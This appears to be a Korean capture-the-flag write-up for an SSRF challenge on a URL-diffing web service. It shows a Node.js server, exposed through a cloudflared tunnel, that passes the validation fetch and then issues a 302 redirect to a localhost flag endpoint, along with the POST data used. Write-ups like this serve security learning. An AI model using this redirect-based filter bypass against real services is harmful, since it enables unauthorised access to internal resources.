SSRF 문제

두 URL을 받아 각 페이지 본문 가져와서 줄 단위 차이를 보여주는 서비스 웹사이트

GET / 

POST /diff

index.js 소스분석

검증단계의 validifyURL 은 fetch(~~ssrfFileter(url)> 로 SSRF필터적용

실제 데이터 전송단계에서는 fetch(url) 밖에없다= 필터가없음

cloudflared quick tunnel 로 공개URL 발급받아서 사용

https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe

서버에는 js 파일 로드

```jsx
const http = require('http');

const PORT     = parseInt(process.env.PORT || '8000', 10);
const FLAG_URL = process.env.FLAG_URL || 'http://[::1]:1337/flag';

const hits = {};
http.createServer((req, res) => {
  const path = req.url.split('?')[0];
  hits[path] = (hits[path] || 0) + 1;
  const n = hits[path];
  const stamp = new Date().toISOString().slice(11, 19);

  if (path === '/a' && n % 2 === 0) {
    console.log(`[${stamp}] ${path} hit#${n}  -> 302 REDIRECT ${FLAG_URL}   (diff fetch / 필터없음)`);
    res.writeHead(302, { Location: FLAG_URL });
    return res.end();
  }
```

local 에서 온 요청한테만 flag를 준다는 방식의 문제라서 

미끼주소를주고 (cloudflare)  공인IP처럼 

개인 서버를 열고 해당 js로드 

js에서 파일로드할때 [::1]:{port}/flag로 302 redirect 요청 , 이때 서버가 필터링을 안해서취약

!문제.png

!flag.png

사용된 POST DATA

url1=https://scanned-transactions-locale-ebooks.trycloudflare.com/a&url2=https://scanned-transactions-locale-ebooks.trycloudflare.com/b